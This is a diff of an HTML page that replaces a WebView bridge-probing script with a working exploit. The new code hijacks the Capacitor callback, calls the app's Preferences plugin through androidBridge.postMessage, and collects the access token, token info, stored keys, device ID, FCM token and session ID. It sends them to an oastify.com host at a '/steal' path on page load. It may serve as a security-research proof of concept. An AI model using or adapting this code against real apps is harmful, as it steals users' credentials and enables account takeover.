@@ -1,99 +1,72 @@
-<html><body>
-<h2>Bridge Dump</h2>
-<pre id="out"></pre>
+<html>
+<head><title>X</title></head>
+<body>
+<div id="s" style="display:none"></div>
 <script>
-const o = document.getElementById('out');
-const log = (s) => { o.textContent += s + '\n'; };
+var stolen = {};
 
-const KNOWN_BRIDGES = [
-  'androidBridge',
-  'CapacitorCookiesAndroidInterface',
-  'CapacitorHttpAndroidInterface',
-  '_cordovaNative'
-];
+window.Capacitor = {
+  fromNative: function(d) {
+    var cid = d.callbackId;
+    var val = d.data ? d.data.value : null;
 
-log('=== KNOWN BRIDGE CHECK ===');
-KNOWN_BRIDGES.forEach(name => {
-  const obj = window[name];
-  if (obj) {
-    log('[FOUND] window.' + name + ' = ' + typeof obj);
-    const methods = [];
-    for (const k in obj) {
-      try { methods.push(k + '(' + typeof obj[k] + ')'); } catch(e) {}
+    if (cid === "t1" && val) {
+      stolen.accessToken = val;
+      document.getElementById("s").textContent += "Authorize: " + val.substring(0,40) + "...\n";
     }
-    if (methods.length) log('  methods: ' + methods.join(', '));
-    // Test callable
-    try {
-      if (typeof obj.isEnabled === 'function') {
-        log('  isEnabled() = ' + obj.isEnabled());
-      }
-    } catch(e) { log('  isEnabled error: ' + e); }
-  } else {
-    log('[MISS]  window.' + name);
-  }
-});
-
-log('\n=== FULL WINDOW SCAN ===');
-const dominated = new Set(Object.getOwnPropertyNames(HTMLElement.prototype));
-Object.getOwnPropertyNames(window).forEach(k => {
-  if (dominated.has(k)) return;
-  try {
-    const v = window[k];
-    if (v && typeof v === 'object' && v !== window && v !== document
-        && v !== navigator && v !== location && v !== history
-        && !(v instanceof HTMLElement) && !(v instanceof Event)) {
-      const s = String(v);
-      if (s === '[object Object]') {
-        const ms = [];
-        for (const m in v) {
-          try { ms.push(m + ':' + typeof v[m]); } catch(e) {}
-        }
-        if (ms.length > 0 && ms.length < 30) {
-          log('[OBJ] window.' + k + ' → ' + ms.join(', '));
-        }
-      }
+    if (cid === "t2" && val) {
+      stolen.tokenInfo = val;
+      document.getElementById("s").textContent += "TokenInfo: " + val.substring(0,60) + "...\n";
     }
-  } catch(e) {}
-});
-
-log('\n=== setCookie TEST ===');
-try {
-  const ci = window.CapacitorCookiesAndroidInterface;
-  if (ci && typeof ci.setCookie === 'function') {
-    ci.setCookie('https://localhost', 'bridgetest=1; Path=/');
-    log('[OK] setCookie callable from external origin!');
-  } else {
-    log('[FAIL] setCookie not available');
-  }
-} catch(e) { log('[ERR] ' + e); }
-
-log('\n=== androidBridge postMessage TEST ===');
-try {
-  const ab = window.androidBridge;
-  if (ab && typeof ab.postMessage === 'function') {
-    log('[CRITICAL] androidBridge.postMessage is callable!');
-    // Don't actually call it — just confirm existence
-  } else {
-    log('[MISS] androidBridge not accessible (WebMessageListener mode)');
-  }
-} catch(e) { log('[ERR] ' + e); }
-
-log('\n=== _cordovaNative exec TEST ===');
-try {
-  const cn = window._cordovaNative;
-  if (cn && typeof cn.exec === 'function') {
-    log('[FOUND] _cordovaNative.exec exists');
-    // Try with wrong secret — should get IllegalAccessException
-    try {
-      const r = cn.exec(0, 'Device', 'getDeviceInfo', 'cb1', '[]');
-      log('  exec(0,...) returned: ' + r);
-    } catch(e) {
-      log('  exec(0,...) threw: ' + e.message);
+    if (cid === "t3") {
+      stolen.keys = d.data ? JSON.stringify(d.data.keys) : null;
+      document.getElementById("s").textContent += "Keys: " + stolen.keys + "\n";
     }
-  } else {
-    log('[MISS] _cordovaNative not accessible');
-  }
-} catch(e) { log('[ERR] ' + e); }
+    if (cid === "t4" && val) {
+      stolen.deviceId = val;
+    }
+    if (cid === "t5" && val) {
+      stolen.fcm = val;
+    }
+    if (cid === "t6" && val) {
+      stolen.sessionId = val;
+    }
 
-log('\nDone. ' + new Date().toISOString());
-</script></body></html>
+    if (stolen.accessToken) {
+      var img = new Image();
+      img.src = "https://b9lna30rpsgxcbr4hgm2so8tekkb81wq.oastify.com/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
+    }
+  }
+};
+
+function call(id, key) {
+  androidBridge.postMessage(JSON.stringify({
+    type: "js.call",
+    callbackId: id,
+    pluginId: "Preferences",
+    methodName: "get",
+    options: { key: key }
+  }));
+}
+
+function keys() {
+  androidBridge.postMessage(JSON.stringify({
+    type: "js.call",
+    callbackId: "t3",
+    pluginId: "Preferences",
+    methodName: "keys",
+    options: {}
+  }));
+}
+
+setTimeout(function() {
+  call("t1", "Authorize");
+  call("t2", "tokenInfo");
+  keys();
+  call("t4", "deviceId");
+  call("t5", "fcm-token");
+  call("t6", "qpon_session_id");
+}, 500);
+</script>
+</body>
+</html>
